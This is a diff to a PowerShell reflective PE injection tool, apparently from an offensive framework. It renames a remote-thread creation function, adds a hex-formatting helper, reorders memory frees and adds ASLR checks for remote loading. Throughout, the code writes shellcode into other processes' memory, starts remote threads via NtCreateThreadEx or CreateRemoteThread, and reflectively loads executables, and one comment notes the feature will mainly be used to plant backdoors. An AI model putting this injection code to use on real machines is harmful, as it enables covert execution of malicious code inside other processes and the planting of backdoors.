@@ -890,6 +890,20 @@ $RemoteScriptBlock = {
 		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
 		return ([BitConverter]::ToInt64($ValueBytes, 0))
 	}
+
+
+    Function Get-Hex
+    {
+        Param(
+        [Parameter(Position = 0, Mandatory = $true)]
+        $Value #We will determine the type dynamically
+        )
+
+        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
+        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.
+
+        return $Hex
+    }
 	
 	
 	Function Test-MemoryRangeValid
@@ -1094,7 +1108,7 @@ $RemoteScriptBlock = {
 	}
 	
 	
-	Function Invoke-CreateRemoteThread
+	Function Create-RemoteThread
 	{
 		Param(
 		[Parameter(Position = 1, Mandatory = $true)]
@@ -1120,7 +1134,7 @@ $RemoteScriptBlock = {
 		#Vista and Win7
 		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
 		{
-			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
+			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
 			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
 			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
@@ -1131,13 +1145,13 @@ $RemoteScriptBlock = {
 		#XP/Win8
 		else
 		{
-			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
+			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
 			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
 		}
 		
 		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
 		{
-			Write-Verbose "Error creating remote thread, thread handle is null"
+			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
 		}
 		
 		return $RemoteThreadHandle
@@ -1376,7 +1390,7 @@ $RemoteScriptBlock = {
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1397,7 +1411,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
+			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1441,6 +1455,7 @@ $RemoteScriptBlock = {
 		)
 
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+
 		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
         #If not loading by ordinal, write the function name to the remote process memory
         if (-not $LoadByOrdinal)
@@ -1457,7 +1472,6 @@ $RemoteScriptBlock = {
 
 		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
 		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
-		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
 		    if ($Success -eq $false)
 		    {
 			    Throw "Unable to write DLL path to remote process memory"
@@ -1488,7 +1502,6 @@ $RemoteScriptBlock = {
 		
 		#Write Shellcode to the remote process which will call GetProcAddress
 		#Shellcode: GetProcAddress.asm
-		#todo: need to have detection for when to get by ordinal
 		[Byte[]]$GetProcAddressSC = @()
 		if ($PEInfo.PE64Bit -eq $true)
 		{
@@ -1541,7 +1554,7 @@ $RemoteScriptBlock = {
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
 		{
@@ -1557,9 +1570,14 @@ $RemoteScriptBlock = {
 		}
 		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
+        #Cleanup remote process memory
 		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
-		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
 		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+
+        if (-not $LoadByOrdinal)
+        {
+            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+        }
 		
 		return $ProcAddress
 	}
@@ -1838,13 +1856,6 @@ $RemoteScriptBlock = {
 					{
 				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
 					}
-
-                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
-                    if (-not $LoadByOrdinal -and $ProcedureNamePtr -ne [IntPtr]::Zero)
-                    {
-                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
-                        $ProcedureNamePtr = [IntPtr]::Zero
-                    }
 					
 					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
 					{
@@ -1863,6 +1874,14 @@ $RemoteScriptBlock = {
 					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
 					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
 					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
+
+                    #Cleanup
+                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
+                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
+                    {
+                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
+                        $ProcedureNamePtr = [IntPtr]::Zero
+                    }
 				}
 				
 				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
@@ -2032,7 +2051,7 @@ $RemoteScriptBlock = {
 
 		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
 		{
-			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
+			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
 		}
 
 		#Prepare the shellcode
@@ -2405,6 +2424,7 @@ $RemoteScriptBlock = {
 		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
 		Write-Verbose "Allocating memory for the PE and write its headers to memory"
 		
+        #ASLR check
 		[IntPtr]$LoadAddr = [IntPtr]::Zero
         $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
 		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
@@ -2415,6 +2435,15 @@ $RemoteScriptBlock = {
         elseif ($ForceASLR -and (-not $PESupportsASLR))
         {
             Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
+        }
+
+        if ($ForceASLR -and $RemoteLoading)
+        {
+            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
+        }
+        if ($RemoteLoading -and (-not $PESupportsASLR))
+        {
+            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
         }
 
 		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
@@ -2457,7 +2486,7 @@ $RemoteScriptBlock = {
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
 		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
-		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
+		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
 		
 		
 		#Copy each section from the PE in to memory
@@ -2570,7 +2599,7 @@ $RemoteScriptBlock = {
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
 				{
@@ -2590,7 +2619,7 @@ $RemoteScriptBlock = {
 			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
 			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
 			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
+			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
 
 			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
 
@@ -2822,7 +2851,7 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 		}
 		
 		#Don't free a library if it is injected in a remote process or if it is an EXE.
